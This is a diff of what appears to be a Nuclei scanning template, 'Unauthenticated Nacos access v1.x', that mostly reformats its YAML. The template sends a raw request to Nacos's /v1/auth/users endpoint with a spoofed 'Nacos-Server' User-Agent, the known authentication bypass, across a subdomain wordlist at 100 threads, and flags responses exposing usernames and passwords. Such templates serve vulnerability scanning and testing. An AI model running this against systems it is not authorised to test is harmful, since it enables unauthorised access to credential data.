@@ -1,40 +1,38 @@
 id: unauthenticated-nacos-access 2
-
 info:
-  name: Unauthenticated Nacos access v1.x
   author: taielab,pikpikcu
+  name: Unauthenticated Nacos access v1.x
   severity: critical
-#  issues: https://github.com/alibaba/nacos/issues/4593
   tags: nacos,unauth
+requests:
+- attack: sniper
+  matchers:
+  - part: header
+    type: word
+    words:
+    - 'Content-Type: application/json'
+  - condition: and
+    part: body
+    regex:
+    - '"username":'
+    - '"password":'
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
 
-http:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+    Host: {{Subdomains}}
 
-    raw:
-      - |
-        GET /v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Nacos-Server
-        Accept-Encoding: gzip, deflate
-        Accept: */*
-    matchers-condition: and
-    matchers:
+    User-Agent: Nacos-Server
 
-      - type: word
-        words:
-          - "Content-Type: application/json"
-        part: header
+    Accept-Encoding: gzip, deflate
 
-      - type: regex
-        regex:
-          - '"username":'
-          - '"password":'
-        part: body
-        condition: and
+    Accept: */*
 
-      - type: status
-        status:
-          - 200
+    '
+  threads: 100
